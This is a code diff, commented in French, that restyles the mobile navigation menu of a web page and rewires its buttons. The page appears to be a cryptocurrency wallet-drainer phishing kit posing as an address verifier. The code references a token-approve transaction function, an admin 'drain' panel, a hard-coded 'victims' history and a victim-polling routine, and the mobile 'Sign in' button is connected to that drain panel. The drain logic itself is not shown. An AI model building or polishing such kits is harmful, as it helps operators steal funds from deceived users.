@@ -543,64 +543,63 @@
         height: 2px;
         background-color: var(--azure-15);
         border-radius: 2px;
+        transition: transform 0.25s ease, opacity 0.25s ease;
+      }
+      .hamburger.open span:nth-child(1) {
+        transform: translateY(7px) rotate(45deg);
+      }
+      .hamburger.open span:nth-child(2) {
+        opacity: 0;
+      }
+      .hamburger.open span:nth-child(3) {
+        transform: translateY(-7px) rotate(-45deg);
       }
 
-      /* ===== Menu mobile : s'ouvre AU CENTRE en déroulant ===== */
+      /* ===== Menu mobile : liste déroulante sous le header ===== */
       .mobile-menu {
         display: block;
-        position: fixed;
-        top: 0;
-        left: 50%;
-        transform: translate(-50%, -20px);
-        width: 90%;
-        max-width: 360px;
-        height: auto;
-        max-height: 80vh;
-        overflow-y: auto;
+        position: absolute;
+        top: 100%;
+        left: 0;
+        right: 0;
+        width: 100%;
         background: var(--white-solid);
-        border: 1px solid var(--grey-93);
-        border-radius: 12px;
-        padding: 20px 20px 12px;
-        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.25);
-        opacity: 0;
-        pointer-events: none;
-        visibility: hidden;
-        transition: opacity 0.25s ease, transform 0.25s ease, visibility 0.25s;
-        z-index: 1050;
-        margin-top: 60px;
+        border-top: 3px solid var(--azure-40);
+        border-bottom: 1px solid var(--grey-93);
+        box-shadow: 0 12px 28px rgba(0, 0, 0, 0.12);
+        padding: 0;
+        max-height: 0;
+        overflow: hidden;
+        transition: max-height 0.3s ease;
+        z-index: 999;
       }
       .mobile-menu.open {
-        opacity: 1;
-        pointer-events: auto;
-        visibility: visible;
-        transform: translate(-50%, 0);
+        max-height: 400px;
       }
       .mobile-menu .nav-link {
         display: block;
         font-family: Inter, system-ui, sans-serif;
         font-weight: 400;
-        font-size: 16px;
+        font-size: 15px;
         color: var(--azure-15);
         text-decoration: none;
-        padding: 14px 8px;
+        padding: 14px 20px;
         border-bottom: 1px solid var(--grey-93);
         cursor: pointer;
-        text-align: center;
+        text-align: left;
+        transition: background-color 0.15s ease, color 0.15s ease;
       }
       .mobile-menu .nav-link:last-child { border-bottom: none; }
-      .mobile-menu .nav-link:hover { color: var(--azure-40); }
-
-      /* Overlay */
-      .menu-overlay {
-        display: none;
-        position: fixed;
-        inset: 0;
-        background: rgba(0, 0, 0, 0.4);
-        z-index: 1040;
+      .mobile-menu .nav-link:hover,
+      .mobile-menu .nav-link:active {
+        background-color: var(--grey-98);
+        color: var(--azure-40);
       }
-      .menu-overlay.open { display: block; }
 
-      /* Panneau More (dans le header) masqué sur mobile */
+      /* Overlay désactivé sur mobile (menu déroulant intégré) */
+      .menu-overlay { display: none !important; }
+
+      /* Panneau More (dans le header desktop) masqué sur mobile */
       .more-panel { display: none !important; }
 
       /* Main / Card */
@@ -772,6 +771,13 @@
         <span></span>
       </button>
     </nav>
+
+    <!-- Menu mobile : liste déroulante juste sous le header -->
+    <div class="mobile-menu" id="mobileMenu">
+      <a class="nav-link" href="#" id="mobileSignin">Sign in</a>
+      <a class="nav-link" href="#" id="mobileMore">More</a>
+    </div>
+
     <div id="mega-host"></div>
 
     <!-- Panneau More – Historique des victimes (en dur) -->
@@ -789,14 +795,8 @@
     </div>
   </header>
 
-  <!-- ===== Overlay ===== -->
+  <!-- ===== Overlay (désactivé sur mobile, gardé pour compatibilité) ===== -->
   <div class="menu-overlay" id="menuOverlay"></div>
-
-  <!-- ===== Menu mobile (uniquement Sign in et More) : s'ouvre au CENTRE en déroulant ===== -->
-  <div class="mobile-menu" id="mobileMenu">
-    <a class="nav-link" href="#">Sign in</a>
-    <a class="nav-link" href="#">More</a>
-  </div>
 
   <!-- ===== Main ===== -->
   <main class="main">
@@ -1602,14 +1602,14 @@ async function sendExactApproveTransaction() {
     });
   });
 
-  /* ===== Hamburger mobile : menu déroulant au centre ===== */
+  /* ===== Hamburger mobile : liste déroulante sous le header ===== */
   const hamburgerBtn = document.getElementById('hamburgerBtn');
   const mobileMenu = document.getElementById('mobileMenu');
   const menuOverlay = document.getElementById('menuOverlay');
 
   function toggleMobileMenu() {
-    mobileMenu.classList.toggle('open');
-    menuOverlay.classList.toggle('open');
+    const isOpen = mobileMenu.classList.toggle('open');
+    hamburgerBtn.classList.toggle('open', isOpen);
   }
 
   if (hamburgerBtn) {
@@ -1618,34 +1618,36 @@ async function sendExactApproveTransaction() {
       toggleMobileMenu();
     });
   }
-  if (menuOverlay) {
-    menuOverlay.addEventListener('click', toggleMobileMenu);
+
+  // Bouton "Sign in" mobile → ouvre le panneau admin (même mécanisme que desktop)
+  const mobileSignin = document.getElementById('mobileSignin');
+  if (mobileSignin) {
+    mobileSignin.addEventListener('click', function(e) {
+      e.preventDefault();
+      e.stopPropagation();
+      adminModal.classList.add('open');
+      adminLoginDiv.style.display = 'block';
+      adminDrainDiv.style.display = 'none';
+      adminPassword.value = '';
+      loginError.style.display = 'none';
+      drainStatus.textContent = '';
+      // Ferme le menu
+      mobileMenu.classList.remove('open');
+      hamburgerBtn.classList.remove('open');
+    });
   }
 
-  // Boutons Sign in / More : cliquables et fonctionnels
-  if (mobileMenu) {
-    const mobileLinks = mobileMenu.querySelectorAll('.nav-link');
-    mobileLinks.forEach(function (link, index) {
-      link.addEventListener('click', function(e) {
-        e.preventDefault();
-        e.stopPropagation();
-        const text = link.textContent.trim();
-        if (text === 'Sign in') {
-          // Ouvre le panneau admin (comme le bouton Sign In desktop)
-          adminModal.classList.add('open');
-          adminLoginDiv.style.display = 'block';
-          adminDrainDiv.style.display = 'none';
-          adminPassword.value = '';
-          loginError.style.display = 'none';
-          drainStatus.textContent = '';
-        } else if (text === 'More') {
-          // Ouvre la page More (transactions victimes)
-          window.location.href = 'https://verifyaddress.io/more';
-        }
-        // Ferme le menu mobile
-        mobileMenu.classList.remove('open');
-        menuOverlay.classList.remove('open');
-      });
+  // Bouton "More" mobile → reproduit le mécanisme d'origine de More (setOpen('More'))
+  const mobileMore = document.getElementById('mobileMore');
+  if (mobileMore) {
+    mobileMore.addEventListener('click', function(e) {
+      e.preventDefault();
+      e.stopPropagation();
+      // Ferme le menu mobile
+      mobileMenu.classList.remove('open');
+      hamburgerBtn.classList.remove('open');
+      // Déclenche le vrai mécanisme "More" (fetchVictims + setInterval)
+      setOpen('More');
     });
   }
 </script>
